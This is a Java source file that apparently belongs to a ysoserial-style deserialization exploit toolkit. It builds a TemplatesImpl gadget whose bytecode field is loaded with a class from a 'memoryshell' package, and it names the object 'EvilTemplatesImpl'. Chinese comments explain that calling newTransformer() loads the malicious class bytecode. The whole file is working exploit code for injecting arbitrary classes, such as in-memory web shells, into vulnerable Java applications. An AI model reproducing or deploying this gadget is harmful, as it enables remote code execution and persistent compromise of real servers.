package templates;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import static utils.Yso.setFieldValue;

public class TemplatesGenerator {
    public static TemplatesImpl getTemplatesImpl() throws Exception{
        /*
        调用  templates.newTransformer()  即可加载恶意类字节码
         */
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {
                ClassPool.getDefault().get(
                        //在这里填加载的类
                        memoryshell.HelloTemplatesImpl.class.getName()
                ).toBytecode()});
        setFieldValue(templates, "_name", "EvilTemplatesImpl"); setFieldValue(templates,
                "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
}
